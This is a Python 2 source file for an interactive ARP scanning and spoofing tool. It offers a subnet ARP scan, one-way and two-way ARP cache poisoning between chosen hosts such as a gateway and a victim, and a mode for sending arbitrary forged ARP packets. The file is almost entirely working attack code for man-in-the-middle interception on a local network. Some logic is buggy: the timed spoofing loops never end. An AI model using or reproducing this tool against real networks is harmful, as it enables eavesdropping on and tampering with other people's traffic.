from wsocket import arp, wsocket
import sys, time

"""
*
* An example arp spoof tools
*
"""

def arpscan(socket, time=5):

    if socket.interFace is None:
        socket.raiseError(socket.dependencyError,
                          "You need to  select an interface first")
        return 0

    for i in range(1, socket.subnetSize):
        ip = socket.ip_block[:]
        ip[2] += i / 255
        ip[3] += i
        socket.send(
            arp.ARP(SMAC=socket.MAC, DIP=".".join(map(lambda x: str(x), ip))))

        socket.settimeout(time)
    while 1:
        try:
            redata = socket.recv(1024)
        except:
            print "[*] Done..."
            break
        sys.stdout.flush()
        showARP(arp.unpackARP(redata))
    return 1


def arpspoof(socket, type, interval):
    if interval == "":
        interval = 1.0
    else:
        interval = float(interval)
    if type == 1:

        SIP = raw_input("[+] Set Source IP [" + socket.defaultGateWay + "]:")
        Time = raw_input("[+] Set ARP Proof time[Forever]:")

        SIP = SIP if SIP is not "" else socket.defaultGateWay

        ARP = arp.ARP(SIP=SIP, SMAC=socket.MAC, ARPType='reply')

        if Time == "" or Time == "Forever" or Time == "forever":
            while 1:
                socket.send(ARP)
                print "[*] Telling  %s   %-17s is at  %s" % (ARP.DMAC, ARP.SIP,
                                                             ARP.SMAC)
                time.sleep(interval)
        else:
            try:
                Time = int(Time)
            except:
                print "[!]Option Time must be a int!"
                return 0
            t = time.time()
            while t - time.time() < Time:
                socket.send(ARP)
                print "[*] Telling  %15s   %-17s is at  %20s" % (ARP.DMAC,
                                                                 ARP.SIP,
                                                                 ARP.SMAC)
                time.sleep(interval)
        return 1
    elif type == 2:
        DMAC_1 = ""
        DMAC_2 = ""
        # DMAC_1 = raw_input("[+] Set Target-1 MAC [FF:FF:FF:FF:FF:FF]:")
        DIP_1 = raw_input(
            "[+] Set Target-1 IP  [" + socket.defaultGateWay + "]:")
        # DMAC_2 = raw_input("[+] Set Target-2 MAC [FF:FF:FF:FF:FF:FF]:")
        DIP_2 = raw_input(
            "[+] Set Target-2 IP  [" + socket.defaultGateWay + "]:")
        Time = raw_input("[+] Set ARP proof time [Forever]:")

        DIP_1 = DIP_1 if DIP_1 is not "" else socket.defaultGateWay
        DIP_2 = DIP_2 if DIP_2 is not "" else socket.defaultGateWay

        ARP_1 = arp.ARP(
            DMAC=DMAC_1, DIP=DIP_1, SMAC=socket.MAC, SIP=DIP_2, ARPType='reply')
        ARP_2 = arp.ARP(
            DMAC=DMAC_2, DIP=DIP_2, SMAC=socket.MAC, SIP=DIP_1, ARPType='reply')
        if Time == "" or Time == "Forever" or Time == "forever":
            while 1:
                socket.send(ARP_1)
                socket.send(ARP_2)
                print "[*] Telling  %s   %-17s is at  %s" % (ARP_1.DMAC,
                                                             ARP_1.SIP,
                                                             ARP_1.SMAC)
                print "[*] Telling  %s   %-17s is at  %s" % (ARP_2.DMAC,
                                                             ARP_2.SIP,
                                                             ARP_2.SMAC)
                time.sleep(interval)
        else:
            try:
                Time = int(Time)
            except:
                print "[!]Option Time must be a int!"
                return 0
            t = time.time()
            while t - time.time() < Time:
                socket.send(ARP_1)
                socket.send(ARP_2)
                print "[*] Telling  %s   %-17s is at  %s" % (ARP_1.DMAC,
                                                             ARP_1.SIP,
                                                             ARP_1.SMAC)
                print "[*] Telling  %s   %-17s is at  %s" % (ARP_2.DMAC,
                                                             ARP_2.SIP,
                                                             ARP_2.SMAC)
                time.sleep(interval)
        return 1

    return 0


def showARP(ARPtuple):
    if ARPtuple[0] == 8:
        if ARPtuple[1] == 2:
            print "[+] " + "Address %15s   reply at    %s" % (ARPtuple[2],
                                                              ARPtuple[3])
        elif ARPtuple[1] == 1:
            print "[+] " + "Who is  %-15s     ?   tell    %s" % (ARPtuple[3],
                                                                ARPtuple[2])
        else:
            print "[-] Bad ARP package..."
            return 0
        return 1
    else:
        print "[!] Not a ARP package..."
        return 0


def sendCuscomARP(socket, ARPtype, interval):
    if interval == "":
        interval = 1.0
    else:
        interval = float(interval)
    DMAC = raw_input("[+] Set Destination MAC[FF:FF:FF:FF:FF:FF]:")
    DIP = raw_input("[+] Set Destination IP [" + socket.defaultGateWay + "]:")
    SMAC = raw_input("[+] Set Source MAC[11:22:33:44:55:66]:")
    SIP = raw_input("[+] Set Source IP [" + socket.defaultGateWay + "]:")
    Time = raw_input("[+] Set ARP Proof time[Forever]:")

    DIP = DIP if DIP is not "" else socket.defaultGateWay
    SIP = SIP if SIP is not "" else socket.defaultGateWay

    ARP = arp.ARP(DMAC=DMAC, DIP=DIP, SMAC=SMAC, SIP=SIP, ARPType=ARPtype)

    if Time == "" or Time == "Forever" or Time == "forever":
        while 1:
            socket.send(ARP)
            if ARPtype == 'request':
                print "[+] " + "Who is   %15s    ?   tell    %s" % (ARP.DIP,
                                                                    ARP.SIP)
            else:
                print "[*] Telling  %s   %-17s is at  %s" % (ARP.DMAC, ARP.SIP,
                                                             ARP.SMAC)
            time.sleep(interval)
    else:
        try:
            Time = int(Time)
        except:
            print "[!]Option Time must be a int!"
            return 0
        t = time.time()
        while t - time.time() < Time:
            socket.send(ARP)
            if ARPtype == 'request':
                print "[+] " + "Who is   %15s    ?   tell    %s" % (ARP.DIP,
                                                                    ARP.SIP)
            else:
                print "[*] Telling  %s   %-17s is at  %s" % (ARP.DMAC, ARP.SIP,
                                                             ARP.SMAC)
            time.sleep(interval)
    return 1


# ==================================================== main ===========================================================

print '''
            _    ____  ____       ____                     __ 
           / \  |  _ \|  _ \     / ___| _ __   ___   ___  / _|
          / _ \ | |_) | |_) |    \___ \| '_ \ / _ \ / _ \| |_ 
         / ___ \|  _ <|  __/      ___) | |_) | (_) | (_) |  _|
        /_/   \_\_| \_\_|        |____/| .__/ \___/ \___/|_|  
                                       |_|             
                                              
        Github:    < https://www.github.com/WananpIG >
        Blog:      < https://www.wzsite.cn >
'''

s = wsocket.wsocket()
print "[*] Welcome!"

while 1:
    print "[+] Choose a ineterface first"
    print "[*] ===================================================================\n"
    print "%10s%14s%20s%20s" % ("name", "ip", "mask", "MAC")
    for i in range(len(s.interFaceList)):
        print "%2d.%8s%20s%18s%22s" % (i, s.interFaceList[i][0],
                                       s.interFaceList[i][1],
                                       s.interFaceList[i][2],
                                       s.interFaceList[i][3])
    print "\n[*] ==================================================================="
    try:
        n = int(raw_input(">"))
        interName = s.interFaceList[n][0]
    except:
        print "[!] You must select an interface in this list"
        continue

    if s.setInterFace(s.interFaceList[n]) == 1:
        print "[*] Choose interface => ", interName
        s.bind((interName, 0x0806))
        break
while 1:

    print "[*] Function list "
    print " 1. ARP Scan. "
    print " 2. ARP Spoof. "
    print " 3. Send a custom ARP packet. "
    print " 4. Exit.  "

    try:

        choose = int(raw_input(">"))

    except:

        print "[!] Invalid choice "
        continue

    if choose == 1:

        print "[*] ==================================================================="
        print "[*] Sending %-4d ARP request packages ... " % (s.subnetSize)
        arpscan(s)
        print "[*] ==================================================================="

    elif choose == 2:
        print " 1. one-way ARP spoof"
        print " 2. two-way ARP spoof"
        option = raw_input('>')
        try:
            arpspoof(s, int(option), raw_input("[+] Set time interval[1]:"))
        except KeyboardInterrupt:
            print "\n[!] Aborted by user. "
        except Exception, e:
            print "[!] Something wrong!"
            print "[!]", e
    elif choose == 3:

        print "[*] ARP packet type"
        print " 1. ARP request "
        print " 2. ARP reply "

        ARPtype = ''

        try:
            n = int(raw_input(">"))
        except:
            print "[!] Please select a ARP packet tpye! "
            continue

        if n == 1:
            ARPtype = 'request'

        elif n == 2:
            ARPtype = 'reply'

        else:
            print "[!] Invalid Choice!"
            continue

        try:
            sendCuscomARP(s, ARPtype, raw_input("[+] Set time interval[1]:"))
        except KeyboardInterrupt:
            print "\n[!] Aborted by user. "

        except Exception, e:
            print "[!] Something wrong!"
            print "[!]", e

    elif choose == 4:
        print "[*] See you! "
        exit()
    else:
        print "[!] Invalid choose. "
